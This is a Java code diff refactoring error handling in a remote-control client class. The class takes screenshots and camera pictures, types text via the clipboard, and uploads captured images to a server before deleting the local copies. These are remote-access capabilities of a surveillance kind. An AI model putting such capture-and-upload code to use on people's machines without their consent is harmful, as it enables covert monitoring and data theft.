@@ -38,10 +38,10 @@ public abstract class CommandSet implements ClipboardOwner
     private static final int MAJOR_VERSION = 0;
     private static final int MINOR_VERSION = 4;
 
-    public abstract void eject() throws IOException;
+    public abstract boolean eject();
     public abstract void shutdown() throws IOException;
     public abstract void restart() throws IOException;
-    public abstract void rotate(String direction) throws IOException;
+    public abstract boolean rotate(String direction);
     public abstract void takeCameraPicture();
     public abstract boolean setWallpaper(File wallpaper);
     public abstract void minimise();
@@ -107,24 +107,33 @@ public abstract class CommandSet implements ClipboardOwner
     /**
      * for sending data on the clients machine back to the server. e.g. screenshots
      * @param toSend the file that needs to be sent
-     * @throws IOException if something went wrong sending the file
+     * @return true if the file was sent, false otherwise
      */
-    public void sendFile(File toSend) throws IOException
+    public boolean sendFile(File toSend)
     {
-        byte[] buffer = new byte[(int)toSend.length()];
-        InputStream sendMe = new FileInputStream(toSend);
-
-        outToServer.writeInt((int) toSend.length());
-        int count;
-        int sentBytes = 0;
-        while(sentBytes != toSend.length() && (count = sendMe.read(buffer)) > 0)
+        try
         {
-            sentBytes += count;
-            outToServer.write(buffer, 0, count);
+            byte[] buffer = new byte[(int)toSend.length()];
+            InputStream sendMe = new FileInputStream(toSend);
+
+            outToServer.writeInt((int) toSend.length());
+            int count;
+            int sentBytes = 0;
+            while(sentBytes != toSend.length() && (count = sendMe.read(buffer)) > 0)
+            {
+                sentBytes += count;
+                outToServer.write(buffer, 0, count);
+            }
+
+            outToServer.flush();
+            sendMe.close();
+        }
+        catch(IOException ioe)
+        {
+            return false;
         }
 
-        outToServer.flush();
-        sendMe.close();
+        return true;
     }
 
     public void sendAllImages() //todo: refactor
@@ -150,15 +159,9 @@ public abstract class CommandSet implements ClipboardOwner
         {
             if(file.getName().endsWith(".jpg"))
             {
-                try
-                {
-                    sendFile(file);
-                    file.delete();
-                }
-                catch(IOException ioe)
-                {
-                    ioe.printStackTrace();
-                }
+                sendFile(file);
+                file.deleteOnExit();
+                file.delete();
             }
         }
     }
@@ -232,10 +235,13 @@ public abstract class CommandSet implements ClipboardOwner
      * "types" the given message on the clients machine. Instead of typing each character it uses the systems clipboard
      * to copy and paste the message
      * @param message the message to type out
-     * @throws AWTException if something went wrong creating the robot
+     * @return true if the msg was typed, false otherwise
      */
-    public void type(String message) throws AWTException
+    public boolean type(String message)
     {
+        if(robot == null)
+            return false;
+
         Clipboard clipboard = Toolkit.getDefaultToolkit().getSystemClipboard();
         StringSelection stringSelection = new StringSelection(message);
         clipboard.setContents(stringSelection, this);
@@ -244,6 +250,8 @@ public abstract class CommandSet implements ClipboardOwner
         robot.keyPress(KeyEvent.VK_V);
         robot.keyRelease(KeyEvent.VK_V);
         robot.keyRelease(KeyEvent.VK_CONTROL);
+
+        return true;
     }
 
     /**
@@ -274,15 +282,24 @@ public abstract class CommandSet implements ClipboardOwner
 
     /**
      * takes a screenshot of the clients screen and saves it in our temp directory
-     * @throws IOException if something went wrong created the image file from the bufferedimage
+     * @return true if the screenshot was successful, false otherwise
      */
-    public void takeScreenshot() throws IOException
+    public boolean takeScreenshot()
     {
         Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
         BufferedImage screenImg = robot.createScreenCapture(new Rectangle(screenSize));
         DateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd@HH-mm-ss");
         File screenshot = new File(getTempPath() + "/scr_" + dateFormat.format(new Date()) + ".jpg");
-        ImageIO.write(screenImg, "jpg", screenshot);
+        try
+        {
+            ImageIO.write(screenImg, "jpg", screenshot);
+        }
+        catch(IOException ioe)
+        {
+            return false;
+        }
+
+        return true;
     }
 
     /**
